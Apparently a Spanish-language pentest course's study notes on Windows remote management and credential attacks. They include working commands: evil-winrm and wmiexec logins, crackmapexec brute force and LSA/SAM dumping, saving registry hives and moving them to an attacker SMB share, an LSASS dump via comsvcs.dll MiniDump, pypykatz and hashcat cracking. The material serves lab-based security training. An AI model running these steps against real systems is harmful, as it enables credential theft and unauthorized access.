> Los servidores Windows pueden gestionarse localmente mediante las tareas de administración del Administrador del Servidor en servidores remotos. La administración remota está habilitada por defecto a partir de Windows Server 2016. Esta característica forma parte de las funciones de administración de hardware de Windows que gestionan el hardware del servidor de manera local y remota. Estas funciones incluyen un servicio que implementa el protocolo WS-Management, diagnóstico y control de hardware a través de controladores de gestión de placa base, así como una API COM y objetos de script que permiten escribir aplicaciones que se comunican de manera remota mediante el protocolo WS-Management.

Los principales componentes utilizados para la administración remota de Windows y servidores Windows son:

- **Remote Desktop Protocol (RDP)**
- **Windows Remote Management (WinRM)**
- **Windows Management Instrumentation (WMI)**

### WMI

**Windows Management Instrumentation (WMI)** es la implementación de Microsoft y también una extensión del **Common Information Model (CIM)**, que es la funcionalidad central del estándar **Web-Based Enterprise Management (WBEM)** para la plataforma Windows. WMI permite acceso de lectura y escritura a casi todas las configuraciones en sistemas Windows, lo que lo convierte en la interfaz más crítica en el entorno de Windows para la administración y mantenimiento remoto de computadoras, ya sean PCs o servidores. WMI se accede típicamente a través de **PowerShell**, **VBScript** o la **Windows Management Instrumentation Console (WMIC)**. WMI no es un solo programa, sino que consiste en varios programas y bases de datos, también conocidas como **repositorios**.

#### Footprinting a WMI

La **inicialización de la comunicación WMI** siempre ocurre en el **puerto TCP 135**, y después de establecerse la conexión de manera exitosa, la comunicación se mueve a un **puerto aleatorio**. Un ejemplo de herramienta que se puede usar para esto es el programa [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) del **Impacket toolkit**.

```shell-session
amr251@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```
### WinRM - Administración remota de Windows

> **Windows Remote Management (WinRM)** es un protocolo de administración remota integrado en Windows, basado en la línea de comandos. WinRM utiliza el **Simple Object Access Protocol (SOAP)** para establecer conexiones con hosts remotos y sus aplicaciones. Debido a esto, WinRM debe ser habilitado y configurado explícitamente desde Windows 10. WinRM usa los puertos TCP 5985 y 5986 para la comunicación, siendo el puerto 5986 utilizado para **HTTPS**. Los puertos 80 y 443 fueron previamente usados para esta tarea, pero el puerto 80 se bloqueó por razones de seguridad, por lo que actualmente se utilizan los puertos 5985 y 5986. Con WinRM, es posible ejecutar comandos remotos en otro servidor.

Windows Remote Management (WinRM) es la implementación de Microsoft del protocolo de red **Web Services Management Protocol (WS-Management)**. Este protocolo está basado en servicios web XML y utiliza **SOAP (Simple Object Access Protocol)** para permitir la administración remota de sistemas Windows.

WinRM se encarga de la comunicación entre **WBEM (Web-Based Enterprise Management)** y **WMI (Windows Management Instrumentation)**, que a su vez puede invocar **DCOM (Distributed Component Object Model)**.

Por razones de seguridad, **WinRM debe ser activado y configurado manualmente** en Windows 10. Su uso depende mucho del entorno de seguridad en una red local o de dominio. Generalmente, se emplean **certificados** o mecanismos de **autenticación específicos** para reforzar su seguridad.

WinRM utiliza los puertos **TCP 5985 (HTTP)** y **5986 (HTTPS)**.

### Evil-WinRM

Esta herramienta nos permite comunicarnos con el servicio WinRM.

```shell-session
amr251@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Servicios como sesiones remotas usando **PowerShell** y la fusión de registros de eventos requieren WinRM. Este servicio está habilitado por defecto a partir de Windows Server 2012, pero debe ser configurado manualmente en versiones más antiguas de servidores y clientes, y es necesario crear las excepciones de firewall correspondientes.

### Footprinting WinRM

Ya sabemos que WinRM utiliza puertos TCP `5985` (`HTTP`) and `5986` (`HTTPS`) por defecto, que podemos escanear con nmap. Sin embargo, a veces veremos que solo HTTP se está utilizando en vez de HTTPS

```shell-session
amr251@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

Si queremos saber si uno o más servidores remotos pueden ser alcanzados a través de **WinRM**, podemos hacerlo fácilmente con la ayuda de **PowerShell**. El cmdlet **Test-WsMan** es el encargado de esto, y se le pasa el nombre del host que queremos comprobar. En entornos basados en Linux, podemos usar la herramienta llamada **evil-winrm**, que es otra herramienta de pruebas de penetración diseñada para interactuar con **WinRM**.

```shell-session
amr251@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
```

### Usando crackmapexec

```shell-session
amr251@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

Como vemos arriba, el hecho de encontrar `Pwn3d!` indica que podremos ejecutar comandos a nivel de sistema si iniciamos sesión con el usuario por fuerza bruta.
### Atacando SAM

Con acceso a un sistema Windows que no esté unido a un dominio, puede ser beneficioso intentar volcar rápidamente los archivos asociados con la base de datos SAM para transferirlos a nuestro host de ataque y comenzar a descifrar los hashes de manera offline. Hacer esto offline asegurará que podamos continuar intentando nuestros ataques sin mantener una sesión activa con el objetivo. Vamos a recorrer este proceso juntos usando un host objetivo. Si lo deseas, puedes seguir el proceso creando la máquina objetivo en esta sección. 

##### Copiar las colmenas de registro SAM

Existen tres colmenas del registro que podemos copiar si tenemos acceso como administrador local en el objetivo; cada una tendrá un propósito específico cuando lleguemos a volcar y romper los hashes. A continuación, una breve descripción de cada una en la tabla:

|Colmena del Registro|Descripción|
|---|---|
|hklm\sam|Contiene los hashes asociados con las contraseñas de cuentas locales. Necesitaremos los hashes para poder descifrarlos y obtener las contraseñas de las cuentas de usuario en texto claro.|
|hklm\system|Contiene la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Necesitaremos la clave de arranque para descifrar la base de datos SAM.|
|hklm\security|Contiene credenciales en caché para cuentas de dominio. Podríamos beneficiarnos al tener esto en un objetivo Windows unido a un dominio.|
Podemos crear copias de seguridad de estas colmenas utilizando la utilidad `reg.exe`.

##### Usando reg.exe para copiar las colmenas de registro

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Técnicamente, solo necesitaremos **hklm\sam** y **hklm\system**, pero **hklm\security** también puede ser útil guardarlo, ya que puede contener hashes asociados con las credenciales en caché de cuentas de usuario de dominio presentes en máquinas unidas a un dominio. Una vez que las colmenas se guardan offline, podemos usar varios métodos para transferirlas a nuestro host de ataque. En este caso, usaremos **smbserver.py** de Impacket en combinación con algunos comandos útiles de CMD para mover las copias de las colmenas a un recurso compartido creado en nuestro host de ataque.

##### Creando un share con smbserver.py

Lo único que debemos hacer para crear el recurso compartido es ejecutar **smbserver.py -smb2support** usando Python, darle un nombre al recurso compartido (por ejemplo, **CompData**) y especificar el directorio en nuestro host de ataque donde se almacenarán las copias de las colmenas (**/home/ltnbob/Documents**). Ten en cuenta que la opción **smb2support** garantizará que se admitan las versiones más recientes de SMB. Si no usamos esta opción, habrá errores al intentar conectar desde el objetivo Windows al recurso compartido hospedado en nuestro host de ataque. Las versiones más recientes de Windows no admiten SMBv1 por defecto debido a las numerosas vulnerabilidades graves y los exploits disponibles públicamente.

```shell-session
amr251@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

##### Moviendo copias de colmena a Share

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

Luego podemos confirmar la transferencia correcta con `ls`. 

##### Volcando los hashes con secretsdump.py de Impacket

Una herramienta increíblemente útil que podemos usar para volcar los hashes de manera offline es **secretsdump.py** de Impacket. Impacket se encuentra en la mayoría de las distribuciones modernas de pruebas de penetración. Podemos verificar si está disponible utilizando el comando **locate** en un sistema basado en Linux:

```shell-session
amr251@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

{...}
```

##### Rompiendo hashes con Hashcat

Una vez tenemos los hashes, podemos empezar a intentar romperlos con Hashcat. Los añadimos a un archivo `.txt`, por ejemplo, y usamos la herramienta.

```shell-session
amr251@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>
```

##### Volcado Remoto y Consideraciones sobre los Secretos LSA

Con acceso a credenciales con privilegios de administrador local, también es posible que podamos atacar los **Secretos LSA** a través de la red. Esto podría permitirnos extraer credenciales de un servicio en ejecución, tarea programada o aplicación que use los secretos LSA para almacenar contraseñas.

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

##### Volcado de SAM remoto

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Atacando LSASS

LSASS es un servicio crítico que juega un rol central en administración de credenciales y el proceso de autenticación en todos los sistemas Windows.

##### Volcando el proceso de memoria de LSASS

Similar al proceso de ataque de SAM, con LSASS sería aconsejable crear primero una copia de los procesos de memoria LSASS mediante generación de un volcado de memoria. Crear un archivo de volcado nos permite extraer credenciales offline usando nuestro host de atacante. Hay varios métodos:

**1. Administrador de tareas**

![[Pasted image 20250422125303.png | 800]]

Un archivo llamado `lsass.DMP` es creado y guardado en `AppData\Local\Temp`.

**2. Método del Administrador de Tareas y Alternativa con `rundll32.exe`**

El método del **Administrador de Tareas** depende de que tengamos una sesión interactiva basada en GUI con el objetivo. Podemos utilizar un **método alternativo** para volcar la memoria del proceso **LSASS** a través de una utilidad de línea de comandos llamada **rundll32.exe**. Este método es más rápido que el del Administrador de Tareas y más flexible, porque podemos obtener una sesión de shell en un host Windows con solo acceso a la línea de comandos. Es importante tener en cuenta que las herramientas modernas de antivirus reconocen este método como una actividad maliciosa.

Antes de ejecutar el comando para crear el archivo de volcado, debemos determinar qué **ID de proceso (PID)** se ha asignado a **lsass.exe**. Esto se puede hacer desde **cmd** o **PowerShell**:

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

**3. Encontrando el PID de LSASS en PoweShell**

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Una vez tenemos el PID asignado al proceso LSASS podemos crear el archivo de volcado.

**Creando lsass.dmp con PowerShell**

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

##### Usando Pypykatz para extraer credenciales

El comando inicia el uso de **pypykatz** para analizar los secretos ocultos en el volcado de memoria del proceso **LSASS**. Usamos **lsa** en el comando porque **LSASS** es un subsistema de la autoridad de seguridad local. Luego, especificamos la fuente de datos como un archivo **minidump**, seguido de la ruta al archivo de volcado (**/home/peter/Documents/lsass.dmp**) almacenado en nuestro host de ataque. **Pypykatz** analiza el archivo de volcado y muestra los resultados encontrados:

```shell-session
amr251@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======

{...}

luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

```

- MSV: **MSV** es un paquete de autenticación en Windows que **LSA** utiliza para validar los intentos de inicio de sesión contra la base de datos **SAM**. **Pypykatz** extrajo el **SID**, el **Nombre de usuario**, el **Dominio** e incluso los hashes de contraseñas **NT** y **SHA1** asociados con la sesión de inicio de sesión de la cuenta de usuario **bob** almacenada en la memoria del proceso **LSASS**. Esto será útil en la última etapa de nuestro ataque, que se cubre al final de esta sección.
- WDIGEST: es un protocolo de autenticación antiguo habilitado por defecto en **Windows XP** - **Windows 8** y **Windows Server 2003** - **Windows Server 2012**. **LSASS** almacena en caché las credenciales utilizadas por **WDIGEST** en texto claro. Esto significa que, si nos encontramos atacando un sistema Windows con **WDIGEST** habilitado, lo más probable es que veamos una contraseña en texto claro. Los sistemas operativos Windows modernos tienen **WDIGEST** deshabilitado por defecto
- **DPAPI**: API en **Windows** que cifra y descifra datos a nivel de usuario para aplicaciones de sistema y de terceros.
- **Aplicaciones comunes que usan DPAPI**:
    
    - **Internet Explorer** y **Google Chrome**: Guardan contraseñas de formularios web.
    - **Outlook**: Almacena contraseñas de cuentas de correo.
    - **Remote Desktop Connection**: Guarda credenciales de conexión remota.
    - **Credential Manager**: Guarda credenciales para redes, VPNs, etc.
        
- **Mimikatz/Pypykatz**: Herramientas que extraen la **clave maestra DPAPI** desde la memoria de **LSASS**, lo que permite descifrar las contraseñas y otros secretos de las aplicaciones que usan **DPAPI**.
    
- **Módulo de escalamiento de privilegios en Windows**: Se cubren con mayor detalle las técnicas de ataque contra **DPAPI**.

## Resumen

|**Comando**|**Descripción**|
|---|---|
|`tasklist /svc`|Utilidad basada en línea de comandos en Windows utilizada para listar los procesos en ejecución.|
|`findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`|Utiliza la utilidad basada en línea de comandos `findstr` para buscar la cadena "password" en diferentes tipos de archivos.|
|`Get-Process lsass`|Cmdlet de PowerShell utilizado para mostrar información sobre los procesos. Usarlo con el proceso **LSASS** puede ser útil al intentar volcar la memoria del proceso LSASS desde la línea de comandos.|
|`rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`|Utiliza **rundll32** en Windows para crear un archivo de volcado de memoria de LSASS. Este archivo puede ser transferido a un host de ataque para extraer credenciales.|
|`pypykatz lsa minidump /path/to/lsassdumpfile`|Utiliza **Pypykatz** para analizar e intentar extraer credenciales y hashes de contraseñas de un archivo de volcado de memoria de LSASS.|
|`reg.exe save hklm\sam C:\sam.save`|Utiliza **reg.exe** en Windows para guardar una copia de una colmena del registro en una ubicación específica del sistema de archivos. Puede usarse para hacer copias de cualquier colmena del registro (por ejemplo, **hklm\sam**, **hklm\security**, **hklm\system**).|
|`move sam.save \\<ip>\NameofFileShare`|Utiliza **move** en Windows para transferir un archivo a un recurso compartido de archivos especificado a través de la red.|
|`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`|Utiliza **Secretsdump.py** para volcar los hashes de contraseñas desde la base de datos **SAM**.|
|`vssadmin CREATE SHADOW /For=C:`|Utiliza la herramienta basada en línea de comandos **vssadmin** de Windows para crear una copia sombra del volumen `C:`. Esto puede usarse para hacer una copia segura de **NTDS.dit**.|
|`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`|Utiliza la herramienta basada en línea de comandos **copy** de Windows para crear una copia de **NTDS.dit** a partir de una copia sombra del volumen `C:`.|
